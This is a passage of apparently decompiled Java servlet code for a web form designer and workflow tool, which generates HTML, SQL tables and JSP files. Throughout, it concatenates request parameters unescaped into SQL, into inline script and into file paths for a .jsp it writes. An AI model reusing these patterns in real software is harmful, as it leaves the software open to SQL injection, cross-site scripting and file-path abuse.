        this.out.print(String.valueOf(strHiddenParam) + "</table></div>");
    }
    
    private String getSelectOption(final String _strParam) {
        String vResult = "";
        final int iType = Integer.parseInt(_strParam);
        final int iCount = ExcelModeManager.arrIHiddenParam.length;
        final String strSelect = "";
        for (int i = 0; i < iCount; ++i) {
            if (iType == ExcelModeManager.arrIHiddenParam[i]) {
                vResult = String.valueOf(vResult) + "<option value='" + ExcelModeManager.arrIHiddenParam[i] + "' selected>" + ExcelModeManager.arrStrHiddenParam[i] + "</option>";
            }
            else {
                vResult = String.valueOf(vResult) + "<option value='" + ExcelModeManager.arrIHiddenParam[i] + "'>" + ExcelModeManager.arrStrHiddenParam[i] + "</option>";
            }
        }
        return vResult;
    }
    
    private void getViewTree() {
        this.out.println(Pub.STR_IMPORT);
        this.out.println("<body onload='loadpageEvent();'>");
        final ParamTree treeMgr = new ParamTree();
        treeMgr.request = this.request;
        treeMgr.strTreeId = "testtree";
        this.out.println("<script language='javascript'>");
        this.out.println("var spagecode = '';gs_root = '/pin';");
        this.out.print("function reInvok(_objNode){");
        final String strFun = this.request.getParameter("fun");
        if (strFun != null) {
            this.out.print(strFun);
            this.out.print("(_objNode);");
        }
        this.out.print(" }");
        this.out.println("</script>");
        String strTreeName = this.request.getParameter("rootname");
        if (strTreeName == null) {
            strTreeName = "\u8bf7\u9009\u62e9";
        }
        else {
            strTreeName = EString.encoderStr(strTreeName);
        }
        this.out.println(treeMgr.getTree(strTreeName, this.request.getParameter("id")));
        this.out.println("</body>");
    }
    
    private void getJSData() {
        this.out.println("var arr_Sys_TableData=[");
        final String strDataId = this.request.getParameter("dataid");
        final ParamTree pTree = new ParamTree();
        pTree.request = this.request;
        final TableEx tableEx = pTree.getTableEx(strDataId);
        
        try {
            final int iRecordCount = tableEx.getRecordCount();
            final int iColCount = tableEx.getColCount();
            String strSplit = "";
            for (int i = 0; i < iRecordCount; ++i) {
                final Record record = tableEx.getRecord(i);
                String strColSplit = "";
                this.out.print(strSplit);
                this.out.print("[");
                for (int j = 1; j <= iColCount; ++j) {
                    this.out.print(strColSplit);
                    this.out.print("'");
                    this.out.print(record.getFieldById(j).value);
                    this.out.print("'");
                    strColSplit = ",";
                }
                this.out.println("]");
                strSplit = ",";
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        finally {
            tableEx.close();
        }
        
        this.out.print("];");
    }
    
    private void saveItem() {
        final HttpSession session = this.request.getSession();
        final String strId = this.request.getParameter("id");
        final String strWinId = this.request.getParameter("gs_upl_kc");
        final String kjmc = EString.encoderStr(this.request.getParameter("kjmc"));
        final String kjlx = this.request.getParameter("kjlx");
        final String sjcd = this.request.getParameter("sjcd");
        final String sjlx = this.request.getParameter("sjlx");
        final String xlz = this.request.getParameter("xlzxx");
        final String xlmc = EString.encoderStr(this.request.getParameter("xlzmc"));
        final String strHXX = this.request.getParameter("xzhxx");
        final Object objHash = session.getAttribute("sys_form_data");
        Hashtable hash;
        if (objHash == null) {
            hash = new Hashtable();
        }
        else {
            hash = (Hashtable)objHash;
        }
        hash.put(strId, new String[] { kjmc, kjlx, sjcd, sjlx, xlz, xlmc, strHXX });
        session.setAttribute("sys_form_data", (Object)hash);
        this.out.print(Pub.STR_IMPORT);
        this.out.print("<script>");
        this.out.print("parent.getOpenPage('" + strWinId + "').framedesiner.ylForm.doInsertItem(" + kjlx + ",'" + kjmc + "');");
        this.out.print("parent.closeWinById('" + strWinId + "');");
        this.out.print("</script>");
    }
    
    private void generItemConfig() {
        final String strId = this.request.getParameter("id");
        final String strWinId = this.request.getParameter("gs_upl_kc");
        String kjmc = "";
        String kjlx = "";
        String sjcd = "";
        String sjlx = "";
        String xlz = "";
        String xlmc = "";
        String strhxx = "";
        final Object objHash = this.request.getSession().getAttribute("sys_form_data");
        if (objHash != null) {
            final Hashtable<String, String[]> hash = (Hashtable<String, String[]>)objHash;
            final String[] arrItemMsg = hash.get(strId);
            if (arrItemMsg != null) {
                kjmc = arrItemMsg[0];
                kjlx = arrItemMsg[1];
                sjcd = arrItemMsg[2];
                sjlx = arrItemMsg[3];
                xlz = arrItemMsg[4];
                xlmc = arrItemMsg[5];
                strhxx = arrItemMsg[6];
            }
        }
        String strViewSelValue = "none";
        String strViewHxxValue = "none";
        if (kjlx.equals("4")) {
            strViewSelValue = "";
        }
        else if (kjlx.equals("5")) {
            strViewHxxValue = "";
        }
        this.out.print(Pub.STR_IMPORT);
        this.out.print("<script>gs_root='" + Dic.strCurRoot + "';</script>");
        this.out.print("<form id='add' action='comp?sys_type=saveitem'method='post'  onsubmit='return checkFrom(add);'> <fieldset> <legend style='color:gray;font-size:13;'>\u63a7 \u4ef6 \u5c5e \u6027 \u8bbe \u7f6e</legend> <table width='350'> <tr> <td width='80'>\u63a7 \u4ef6 \u540d \u79f0:</td> <td width='270'><input name='kjmc' type='text' style='width:253;' value='");
        this.out.print(kjmc);
        this.out.print("' rule='bxtx' ruleTip='\u63a7\u4ef6\u540d\u79f0\u5fc5\u987b\u586b\u5199\uff01'></td> </tr> <tr> <td>\u63a7 \u4ef6 \u7c7b \u578b:</td> <td><input  onchange=\"parent.getOpenPage('");
        this.out.print(strWinId);
        this.out.print("').framedesiner.ylForm.changeKJLx(this.value,sjcd,sjlx,trxlz,trxlmc)\" name=\"kjlx\"  id=\"kjlx\"  style=\"width:253;\" value='");
        this.out.print(kjlx);
        this.out.print("'  codes='1,2,3,4,5,6' texts='\u5355 \u884c \u8f93 \u5165 \u6846,\u591a \u884c \u8f93 \u5165 \u6846,\u65e5 \u671f \u8f93 \u5165 \u6846,\u4e0b \u62c9 \u6846,\u5b8f \u63a7 \u4ef6,\u660e \u7ec6 \u8f93 \u5165' class='ylselect'></td> </tr>");
        this.out.print("<tr id='trxlz' style='display:" + strViewSelValue + ";'> <td>\u4e0b\u62c9\u503c\u4fe1\u606f:</td> <td><input name='xlzxx' id='sjcd' type='text' style='width:253;' value='" + xlz + "'></td></tr>");
        this.out.print("<tr id='trxlmc' style='display:" + strViewSelValue + ";'> <td>\u503c\u540d\u79f0\u4fe1\u606f:</td> <td><input name='xlzmc' id='sjcd' type='text' style='width:253;' value='" + xlmc + "'></td></tr>");
        this.out.print("<tr id='trhxx' style='display:" + strViewHxxValue + ";'> <td>\u9009\u62e9\u5b8f\u4fe1\u606f:</td> <td><input  name=\"xzhxx\"  id=\"xzhxx\"  style=\"width:253;\"  value='" + strhxx + "'  nodepcode='pcode'  class='ylselect' seltype='datatree' dataid='1384416501828' nodecode='code'  nodename='name'></td></tr>");
        this.out.print("<tr> <td>\u6570 \u636e \u957f \u5ea6:</td> <td><input name='sjcd' id='sjcd' type='text' style='width:253;' value='");
        this.out.print(sjcd);
        this.out.print("' rule='bxsz' ruleTip='\u6570\u636e\u957f\u5ea6\u5fc5\u987b\u662f\u6574\u6570'></td> </tr> <tr> <td>\u6570 \u636e \u7c7b \u578b:</td> <td><input  name=\"sjlx\"  id=\"sjlx\"  style=\"width:253;\" value='");
        this.out.print(sjlx);
        this.out.print("' codes='1,2,3,4' texts='\u5b57 \u7b26 \u578b,\u6574 \u6570 \u578b,\u5c0f \u6570 \u578b,\u5927 \u6587 \u672c \u578b' class='ylselect'></td> </tr> </table> </fieldset> <table width='330'> <tr> <td align='right'> <input type='hidden' name='id' value='");
        this.out.print(strId);
        this.out.print("'> <input type='hidden' name='gs_upl_kc' value='");
        this.out.print(strWinId);
        this.out.print("'> <br> <button type='submit'>\u786e \u5b9a</button>&nbsp;&nbsp;&nbsp;<button onclick=\"closeWin()\">\u53d6 \u6d88</button></td> </tr> </table> </form>");
    }
    
    private void saveForm() {
        final Object objHash = this.request.getSession().getAttribute("sys_form_data");
        final String strFormId = this.request.getParameter("sys_formid");
        final DBFactory dbf = new DBFactory();
        final EFile eFile = new EFile();
        String strFinForm = eFile.readFile(String.valueOf(Dic.strCurPath) + "/modexcel/" + strFormId + ".html").toString();
        try {
            if (objHash != null) {
                final Hashtable<String, String[]> hash = (Hashtable<String, String[]>)objHash;
                final Enumeration enuFormItems = hash.keys();
                final HashMap<String, Integer> hashItemCode = new HashMap<String, Integer>();
                dbf.sqlExe("DELETE FROM t_sys_item where STYPECODE='" + strFormId + "'", false);
                dbf.sqlExe("DROP TABLE IF EXISTS " + strFormId, false);
                String strCreTabSql = "CREATE TABLE " + strFormId + " (";
                String strSplit = "";
                while (enuFormItems.hasMoreElements()) {
                    final String strItemId = enuFormItems.nextElement().toString();
                    final String[] arrItemMsg = hash.get(strItemId);
                    if (arrItemMsg != null) {
                        String strItemCode = EString.getPy(arrItemMsg[0]).toUpperCase();
                        String strItemType = "";
                        switch (Integer.parseInt(arrItemMsg[3])) {
                            case 1: {
                                strItemCode = "S_" + strItemCode;
                                strItemType = " varchar(" + arrItemMsg[2] + ") DEFAULT ''";
                                break;
                            }
                            case 2: {
                                strItemCode = "I_" + strItemCode;
                                strItemType = " int(" + arrItemMsg[2] + ") DEFAULT '0'";
                                break;
                            }
                            case 3: {
                                strItemCode = "F_" + strItemCode;
                                strItemType = " float(" + arrItemMsg[2] + ") DEFAULT '0'";
                                break;
                            }
                            case 4: {
                                strItemCode = "S_" + strItemCode;
                                strItemType = " text";
                                break;
                            }
                        }
                        Integer iItemCount = hashItemCode.get(strItemCode);
                        final String strPItemCode = strItemCode;
                        if (iItemCount != null) {
                            strItemCode = String.valueOf(strItemCode) + "_" + iItemCount;
                            ++iItemCount;
                            hashItemCode.put(strPItemCode, iItemCount);
                        }
                        else {
                            hashItemCode.put(strPItemCode, new Integer(1));
                        }
                        strCreTabSql = String.valueOf(strCreTabSql) + strSplit + strItemCode + strItemType;
                        strSplit = ",";
                        dbf.sqlExe("INSERT INTO t_sys_item (STYPECODE,SITEMCODE,SITEMNAME,IVIEWWIDTH,ISQL,ISTYLE,IISBT,SDICTYPE,STIP,SITEMSIZE,SITEMTYPE,SRLTFLD,SXXX,SZJ,S_HXX) VALUES ('" + strFormId + "','" + strItemCode + "','" + arrItemMsg[0] + "','" + arrItemMsg[2] + "','1'," + arrItemMsg[1] + ",'" + strItemId + "','" + strFormId + "',NULL,'" + arrItemMsg[2] + "','" + arrItemMsg[3] + "','" + arrItemMsg[4] + "','" + arrItemMsg[5] + "',NULL,'" + arrItemMsg[6] + "')", false);
                        strFinForm = this.insertFormItem(strFinForm, strItemCode, strItemId, arrItemMsg[1], arrItemMsg[4], arrItemMsg[5], arrItemMsg[6]);
                    }
                }
                if (!strSplit.equals("")) {
                    dbf.sqlExe(String.valueOf(strCreTabSql) + ") ENGINE=MyISAM DEFAULT CHARSET=gbk", true);
                }
            }
            strFinForm = strFinForm.replaceAll("ondblClick='ylForm.excelModDbClick\\(this\\);' onClick='ylForm.excelModClick\\(this\\);' onmouseOver='ylForm.excelModOver\\(this\\);' onmouseOut='ylForm.excelModOut\\(this\\);'", "");
            strFinForm = strFinForm.replaceAll("<script type='text/javascript' src='js/ylformdesiner.js'></script>", "");
            strFinForm = "<link href='../css/layout.css' rel='stylesheet' type='text/css'/><link href='../css/table.css' rel='stylesheet' type='text/css'/><link href='../css/win.css' rel='stylesheet' type='text/css'/><script type='text/javascript' src='../js/evenfunction.js'></script><script type='text/javascript' src='../js/yldate.js'></script><script type='text/javascript' src='../js/ylpub.js'></script><script type='text/javascript' src='../js/fc.js'></script><script type='text/javascript' src='../js/LodopFuncs.js'></script><script type='text/javascript' src='../js/print.js'></script><script type='text/javascript' src='../js/ylselect.js'></script><script type='text/javascript' src='../js/yltree.js'></script><script type='text/javascript' src='../js/check.js'></script><script>gs_root='" + Dic.strCurRoot + "';</script>" + "<table width='809' align='center' bgcolor='white' cellpadding='0' cellspacing='0' height='100%'><tr><td background='../images/content/linebg.png' width='7'></td><td align='center' valign='top'>" + "<table cellpadding='0' cellspacing='0' border='0' class='bttoparea'><tr><td align='right'>&nbsp;&nbsp;<button><img src='../images/eve/save.png' align='absmiddle'>&nbsp;\u4fdd \u5b58</button>&nbsp;&nbsp;<button><img src='../images/eve/del.gif' align='absmiddle'>&nbsp;\u53d6 \u6d88</button></td></tr></table>" + strFinForm + "</td><td background='../images/content/linebg.png' width='7'></td></tr></table>";
            eFile.writeFile(String.valueOf(Dic.strCurPath) + "/modexcel/" + strFormId + ".jsp", new StringBuffer(strFinForm), false);
            this.out.println("\u4fdd\u5b58\u6210\u529f\uff01");
        }
        catch (Exception e) {
            this.out.println("\u4fdd\u5b58\u5931\u8d25\uff01");
            e.printStackTrace();
            return;
        }
        finally {
            dbf.close();
        }
        dbf.close();
    }
    
    private String insertFormItem(String _strFinForm, final String _strItemCode, String _strItemId, final String _strType, final String _strSelCode, final String _strSelName, final String _strHXX) {
        _strItemId = _strItemId.replaceAll("\\$", "\\\\\\$");
        final String regex = "id='" + _strItemId + "'>([^<^>]*)</td>";
        final Pattern pa = Pattern.compile(regex);
        final Matcher ma = pa.matcher(_strFinForm);
        final String[] re = new String[2];
        while (ma.find()) {
            final String aStrParam = ma.group(1);
            String strFormElement = "";
            String strAlignStyle = "";
            switch (Integer.parseInt(_strType)) {
                case 1: {
                    strFormElement = "<input type='text' name='" + _strItemCode + "'>";
                    break;
                }
                case 2: {
                    strFormElement = "<textarea name='" + _strItemCode + "' style='width:100%;height:100%;'></textarea>";
                    break;
                }
                case 3: {
                    strFormElement = "<input  readonly value='" + EString.getCurDate() + "' type='text' class='yldate' name='" + _strItemCode + "'>";
                    break;
                }
                case 4: {
                    strFormElement = "<input type='text' class='ylselect' texts='" + _strSelName + "' codes='" + _strSelCode + "' name='" + _strItemCode + "' id='" + _strItemCode + "'>";
                    strAlignStyle = "style='text-align:left;' align='left'";
                    break;
                }
                case 5: {
                    this.fItem.strViewName = _strItemCode;
                    this.fItem.request = this.request;
                    strFormElement = this.fItem.generFormParam(_strHXX, " name=\"" + _strItemCode + "\"  id=\"" + _strItemCode + "\"  style=\"width:100%;\" ").toString();
                    break;
                }
                case 6: {
                    strFormElement = "";
                    break;
                }
            }
            _strFinForm = _strFinForm.replaceAll("id='" + _strItemId + "'>" + aStrParam + "</td>", "id='" + _strItemId + "' " + strAlignStyle + ">" + strFormElement + "</td>");
        }
        return _strFinForm;
    }
    
    private void initFormMsg(final String _strFormId) {
        final Hashtable hash = new Hashtable();
        TableEx tableEx = null;
        
        try {
            tableEx = new TableEx("IISBT,SITEMNAME,ISTYLE,SITEMSIZE,SITEMTYPE,SRLTFLD,SXXX,S_HXX", "t_sys_item", "STYPECODE='" + _strFormId + "'");
            for (int iRecordCount = tableEx.getRecordCount(), i = 0; i < iRecordCount; ++i) {
                final Record record = tableEx.getRecord(i);
                final String strId = record.getFieldByName("IISBT").value.toString();
                final String strKJMC = record.getFieldByName("SITEMNAME").value.toString();
                final String strKJLX = record.getFieldByName("ISTYLE").value.toString();
                final String strSJCD = record.getFieldByName("SITEMSIZE").value.toString();
                final String strSJLX = record.getFieldByName("SITEMTYPE").value.toString();
                final String strXLZ = record.getFieldByName("SRLTFLD").value.toString();
                final String strXLMC = record.getFieldByName("SXXX").value.toString();
                final String strHXX = record.getFieldByName("S_HXX").value.toString();
                hash.put(strId, new String[] { strKJMC, strKJLX, strSJCD, strSJLX, strXLZ, strXLMC, strHXX });
            }
        }
        catch (Exception e) {
            Debug.println("\u67e5\u8be2\u8868\u5355\u4fe1\u606f\u9519\u8bef\uff01" + e);
        }
        finally {
            if (tableEx != null) {
                tableEx.close();
            }
        }
        
        this.request.getSession().setAttribute("sys_form_data", (Object)hash);
    }
    
    private void generForm() {
        final String strFormId = this.request.getParameter("sys_formid");
        this.initFormMsg(strFormId);
        final Pub pub = new Pub();
        this.out.print("<link href='css/layout.css' rel='stylesheet' type='text/css'/><link href='css/table.css' rel='stylesheet' type='text/css'/><link href='css/win.css' rel='stylesheet' type='text/css'/><script type='text/javascript' src='js/evenfunction.js'></script><script type='text/javascript' src='js/yldate.js'></script><script type='text/javascript' src='js/ylpub.js'></script><script type='text/javascript' src='js/fc.js'></script><script type='text/javascript' src='js/LodopFuncs.js'></script><script type='text/javascript' src='js/print.js'></script><script type='text/javascript' src='js/ylselect.js'></script><script type='text/javascript' src='js/yltree.js'></script><script type='text/javascript' src='js/check.js'></script>");
        this.out.print("<body> <table width='100%' height='100%'> <tr><td align='left' height='30'> <table  class='bttoparea'> <tr>");
        this.out.print("<td width='50'><button onclick=\"framedesiner.ylForm.saveFrom('" + strFormId + "');\"><img src='images/eve/save.png' align='absmiddle'>&nbsp;\u4fdd\u5b58\u8868\u5355</button></td>");
        this.out.print("<td width='50'><button onclick=\"framedesiner.ylForm.insertItem(6,'\u660e\u7ec6\u8f93\u5165');\">\u63d2\u5165\u660e\u7ec6</button></td>");
        this.out.print("<td width='50'><button onclick=\"framedesiner.ylForm.insertItem(6,'\u660e\u7ec6\u8f93\u5165');\"> \u8bbe\u7f6e\u8ba1\u7b97</button></td>");
        this.out.print("<td width='50'><button onclick=\"framedesiner.ylForm.insertItem(7,'\u5b8f\u63a7\u4ef6\u7ba1\u7406');\">\u63a7\u4ef6\u7ba1\u7406</button></td><td>");
        this.out.print(pub.getUploadBttn(strFormId));
        this.out.print("</td><td>&nbsp;</td></tr> </table> </td></tr>  <tr><td align='center'> <iframe  frameborder='no' border='0' marginwidth='0' marginheight='0' id='framedesiner' name='framedesiner' width='100%' height='100%' src='comp?sys_type=desiner&sys_formid=" + strFormId + "'></iframe> </td></tr>  </table> </body>");
        this.out.print(pub.getUploadScript());
    }
    
    private void generJs(final String _strPageJs, final PrintWriter out) {
        final File file = new File(String.valueOf(Dic.strCurPath) + "\\js\\" + _strPageJs);
        if (file.exists()) {
            out.println("<script language='javascript' src='js/" + _strPageJs + "'></script>");
        }
    }
    
    private void generGTT() {
        final Hashtable hashHQRC = (Hashtable) QRSC.HASHQRSC.get(this.request.getParameter("sys_pagecode"));
        final String[] arrStrTreeMsg = hashHQRC.get("STREE").toString().split(",");
        final YLTree ylTree = new YLTree(hashHQRC.get("SCONID").toString(), arrStrTreeMsg[0], arrStrTreeMsg[1], arrStrTreeMsg[2]);
        ylTree.request = this.request;
        ylTree.strStarDate = this.request.getParameter("star");
        ylTree.strEndDate = this.request.getParameter("end");
        this.out.println("<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html style='width:100%;height:100%;'>");
        this.out.println("<link href='css/table.css' rel='stylesheet' type='text/css'>");
        this.out.println("<body width='100%' height='100%' scroll='no' style='overflow:hidden;'><div id='gtt'>\u6570\u636e\u52a0\u8f7d\u4e2d...</div></body></html>");
        this.out.print("<script language='javascript' src='js/ylselect.js'></script><script>");
        this.out.print("var _strStar='");
        this.out.print(ylTree.strStarDate);
        this.out.print("';var _strEnd='");
        this.out.print(ylTree.strEndDate);
        this.out.print("';");
        this.out.print("var _strDoStar='");
        this.out.print(this.request.getParameter("dostar"));
        this.out.print("';var _strDoEnd='");
        this.out.print(this.request.getParameter("doend"));
        this.out.print("';");
        this.out.println(ylTree.getTreeData());
        this.out.println("window.onload=function(){yltGtt.initAuto('gtt'," + ylTree.iMinYear + "," + ylTree.iMaxYear + ",2,1);}");
        this.out.print("</script><script language='javascript' src='js/ylgtt.js'></script>");
        this.generJs("p_" + this.request.getParameter("sys_pagecode") + ".js", this.out);
    }
    
    private void generFormDesiner() {
        final EFile eFile = new EFile();
        this.out.println(eFile.readFile(String.valueOf(Dic.strCurPath) + "/modexcel/" + this.request.getParameter("sys_formid") + ".html"));
    }
    
    private void generCheck() {
        final String strParamId = this.request.getParameter("sys_dataid").substring(1);
        final String strParamName = this.request.getParameter("viewname");
        final FormItem fItem = new FormItem();
        fItem.request = this.request;
        fItem.strViewName = strParamName;
        this.out.println(fItem.generFormParam(strParamId, ""));
    }
    
    private void generBranch() {
        final String strParamId = this.request.getParameter("paramid");
        final String strRoot = this.request.getParameter("sys_root");
        TableEx te = null;
        String strDataSets = "";
        String strNodeCode = "";
        String strNodePCode = "";
        String strNodeName = "";
        try {
            te = new TableEx("S_ID,S_NODE,S_NAME,S_PARENT,S_SQL", "t_tree", "S_ID  LIKE '" + strParamId + "%' ORDER BY S_ID");
            final BranchNode bN = new BranchNode();
            bN.strParamId = strParamId;
            bN.request = this.request;
            if (strRoot != null) {
                bN.strRootCode = strRoot;
            }
            for (int i = 0, iLen = te.getRecordCount(); i < iLen; ++i) {
                final Record record = te.getRecord(i);
                strDataSets = record.getFieldByName("S_SQL").value.toString();
                strNodeCode = record.getFieldByName("S_NODE").value.toString();
                strNodeName = record.getFieldByName("S_NAME").value.toString();
                strNodePCode = record.getFieldByName("S_PARENT").value.toString();
                if (strNodeCode.indexOf(".") != -1) {
                    strNodeCode = strNodeCode.substring(strNodeCode.indexOf(".") + 1);
                }
                if (strNodeName.indexOf(".") != -1) {
                    strNodeName = strNodeName.substring(strNodeName.indexOf(".") + 1);
                }
                if (strNodePCode.indexOf(".") != -1) {
                    strNodePCode = strNodePCode.substring(strNodePCode.indexOf(".") + 1);
                }
                bN.solveData(strDataSets, strNodeCode, strNodeName, strNodePCode);
            }
            this.out.println("<!DOCTYPE html  PUBLIC \"-//W3C//DTD XHTML 1.0 Frameset//EN\"  \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-frameset.dtd\">");
            this.out.print("<link href='css/table.css' rel='stylesheet' type='text/css'/>");
            this.out.print("<script type='text/javascript' src='js/panel.js'></script>");
            this.out.print("<script type='text/javascript' src='js/yltreegraph.js'></script>");
            this.out.print("<script type='text/javascript' src='js/ylpub.js'></script>");
            this.out.print("<script type='text/javascript' src='js/evenfunction.js'></script>");
            this.out.print("<body onload=\"yltTreeGraph.init('" + strParamId + "');\">");
            this.out.print("<div id='treepanel' style='left:0;top:0;position: absolute;'></div>");
            this.out.println(bN.getComponent());
            this.out.print("</body>");
        }
        catch (Exception e) {
            e.printStackTrace();
            return;
        }
        finally {
            if (te != null) {
                te.close();
            }
        }
        if (te != null) {
            te.close();
        }
    }
    
    private void generDatOption() {
        final String[] arrStrDataId = this.request.getParameter("sys_dataid").split(",");
        final String[] arrStrNodeId = this.request.getParameter("sys_nodeid").split(",");
        final String[] arrStrNodeNM = EString.encoderStr(this.request.getParameter("sys_nodenm"), "utf-8").split(",");
        TableEx tbl = null;
        final ParamTree pTree = new ParamTree();
        pTree.request = this.request;
        final String strSelectId = this.request.getParameter("selid");
        String arrStrText = "arrStrText=new Array(\"\u8bf7\u9009\u62e9...\"";
        String arrStrCode = "arrStrCode=new Array(\"\"";
        final String strSplit = ",";
        for (int iDataSetCount = arrStrDataId.length, i = 0; i < iDataSetCount; ++i) {
            if (arrStrDataId[i].equals("ALL")) {
                arrStrText = String.valueOf(arrStrText) + strSplit + "\"" + arrStrNodeNM[i] + "\"";
                arrStrCode = String.valueOf(arrStrCode) + strSplit + "\"" + arrStrNodeId[i] + "\"";
            }
            else {
                try {
                    tbl = pTree.getTableEx(arrStrDataId[i]);
                    for (int iDicSize = tbl.getRecordCount(), k = 0; k < iDicSize; ++k) {
                        final Record dicRecord = tbl.getRecord(k);
                        final String strDicValue = dicRecord.getFieldByName(arrStrNodeId[i]).value.toString();
                        final Object objDicName = dicRecord.getFieldByName(arrStrNodeNM[i]).value;
                        arrStrText = String.valueOf(arrStrText) + strSplit + "\"" + objDicName + "\"";
                        arrStrCode = String.valueOf(arrStrCode) + strSplit + "\"" + strDicValue + "\"";
                    }
                }
                catch (Exception e) {
                    Debug.println("\u9519\u8bef\uff01" + e);
                    continue;
                }
                finally {
                    if (tbl != null) {
                        tbl.close();
                    }
                }
                if (tbl != null) {
                    tbl.close();
                }
            }
        }
        this.out.println(String.valueOf(arrStrText) + ");" + arrStrCode + ");");
        System.out.println(String.valueOf(arrStrText) + ");" + arrStrCode + ");");
    }
    
    private void generSingTree() {
        final String strDataId = this.request.getParameter("sys_dataid");
        final String strNodeId = this.request.getParameter("sys_nodeid");
        final String strNodePid = this.request.getParameter("sys_nodepid");
        final String strNodeNM = this.request.getParameter("sys_nodenm");
        final String strRanderDiv = this.request.getParameter("sys_randerid");
        final String strRoot = this.request.getParameter("sys_root");
        String strName = this.request.getParameter("sys_treename");
        if (strName == null) {
            strName = "\u8bf7\u9009\u62e9";
        }
        else {
            strName = EString.encoderStr(strName, "utf-8");
        }
        final YLTree ylTree = new YLTree(strDataId, strNodeId, strNodePid, strNodeNM);
        if (strRoot != null) {
            ylTree.strRoot = strRoot;
        }
        ylTree.request = this.request;
        ylTree.setRootName(strRanderDiv, strName);
        final String strClick = this.request.getParameter("sys_click");
        if (strClick != null) {
            ylTree.setOnClick(String.valueOf(strClick) + "(node);");
        }
        this.out.println(ylTree);
    }
    
    private String getFlowFormMsg(final String _strFlowId) {
        Record record = null;
        TableEx tableEx = null;
        String strValue = "";
        try {
            tableEx = new TableEx("S_FORMS", "t_sys_flow_main", "S_FLOWID='" + _strFlowId + "'");
            record = tableEx.getRecord(0);
            strValue = record.getFieldByName("S_FORMS").value.toString();
        }
        catch (Exception e) {
            e.printStackTrace();
            return strValue;
        }
        finally {
            if (tableEx != null) {
                tableEx.close();
            }
        }
        if (tableEx != null) {
            tableEx.close();
        }
        return strValue;
    }
    
    private void viewFlow(final String _strFlowId) {
        final String strHomeType = this.request.getParameter("viewtype");
        final String strRunId = this.request.getParameter("runid");
        String strVerSion = this.request.getParameter("flowversion");
        String strAudMsg = "null";
        String str_Sys_FromId = "";
        if (strHomeType == null) {
            final String strFormId = str_Sys_FromId = this.getFlowFormMsg(_strFlowId);
            String strFormName = "";
            final Object objPage = QRSC.HASHQRSC.get(strFormId);
            if (objPage != null) {
                final Hashtable hashHQRC = (Hashtable)objPage;
                strFormName = hashHQRC.get("SPAGENAME").toString();
            }
            this.out.print("<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://www.w3.org/1999/xhtml\" style=\"width:100%;height:100%\">");
            this.out.print("<link href='css/flow.css' rel='stylesheet' type='text/css' />");
            this.out.print("<body style='width:100%;height:100%;overflow:hidden;'><table width='100%' height='100%' border='0' cellpadding='0' cellspacing='0'><tr><td height='35'><div id=\"tools\" style='left:0;top:0px;position: absolute;z-index:2;width:100%;height:35px;background:#fafafa;border-bottom:1px solid #e3e3e3;'> <table height=\"100%\"> <tr> <td width=\"30px\">  </td> <td width=\"50px\"><div  class='toolstd' onclick=\"iframeflow.ylt.flow.save('" + _strFlowId + "');\"><img class=\"toolsico\" title='\u4fdd\u5b58' src=\"images/rep/save.png\"  style='cursor:pointer;'></div></td> " + "<td width=\"50px\"><div  class='toolstd' onclick=\"iframeflow.ylt.flow.setDrawType(this,1);\"><img class=\"toolsico\" title='\u6d3b\u52a8' src=\"images/rep/work.png\"></div> </td>" + "<td width=\"50px\"><div  class='toolstd' onclick=\"iframeflow.ylt.flow.setDrawType(this,2);\"><img class=\"toolsico\" title='\u6761\u4ef6' src=\"images/rep/condition.png\"></div> </td>" + "<td width=\"50px\"><div  class='toolstd' onclick=\"iframeflow.ylt.flow.setDrawType(this,3);\"><img class=\"toolsico\" title='\u5f00\u59cb' src=\"images/rep/start.png\"></div> </td>" + "<td width=\"50px\"><div  class='toolstd' onclick=\"iframeflow.ylt.flow.setDrawType(this,4);\"><img class=\"toolsico\" title='\u7ed3\u675f' src=\"images/rep/stop.png\"></div> </td>" + "<td width=\"50px\"><div  class='toolstd' onclick=\"iframeflow.ylt.flow.setDrawType(this,5);\"><img class=\"toolsico\" title='\u5b50\u6d41\u7a0b' src=\"images/rep/fc.png\"></div> </td> " + "<td width=\"50px\"><div  class='toolstd' onclick=\"iframeflow.ylt.flow.setDelModl(this);\"> <img class=\"toolsico\" title='\u5220\u9664' src=\"images/rep/del.png\"></div></td>" + "<td width=\"50px\">\u8868\u5355:</td><td width=\"30px\"><input  readonly='readonly' id='flowselformname' value='" + strFormName + "' onclick=\"iframeflow.ylt.flow.updateForm(this,'" + _strFlowId + "');\"><input id='flowselform' type='hidden' value='" + strFormId + "'></td>" + "<td id='tddebug'></td> </tr> </table> </div></td></tr>");
            this.out.print("<tr><td><iframe name='iframeflow' id='iframeflow' src='comp?sys_type=viewflow&flowid=" + _strFlowId + "&flowversion=" + strVerSion + "&viewtype=flow' width='100%' height='100%' frameborder='no' border='0' marginwidth='0' marginheight='0'  allowTransparency='true'></iframe></td></tr></table></body></html>");
            return;
        }
        this.out.print("<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://www.w3.org/1999/xhtml\" style=\"width:100%;height:100%\">");
        this.out.print("<script src=\"js/panel.js\"></script>");
        this.out.print("<script src=\"js/ylflow.js?v=" + Pub.iVer + "\"></script>");
        this.out.print("<script src=\"res/js/ylflow_set.js\"></script>");
        this.out.print("<script type='text/javascript' src='js/ylselect.js'></script><script type='text/javascript' src='js/yltree.js'></script><script type='text/javascript' src='js/check.js'></script>");
        this.out.print("<script type='text/javascript' src='js/evenfunction.js'></script>");
        this.out.print("<script>gs_root='" + Dic.strCurRoot + "';</script>");
        this.out.print("<link href='css/table.css' rel='stylesheet' type='text/css' />");
        if (strRunId == null) {
            final String strFormId = str_Sys_FromId = this.getFlowFormMsg(_strFlowId);
            String strFormName = "";
            final Object objPage = QRSC.HASHQRSC.get(strFormId);
            if (objPage != null) {
                final Hashtable hashHQRC = (Hashtable)objPage;
                strFormName = hashHQRC.get("SPAGENAME").toString();
            }
        }
        else {
            strAudMsg = this.getAudLog(_strFlowId, strRunId, strVerSion);
        }
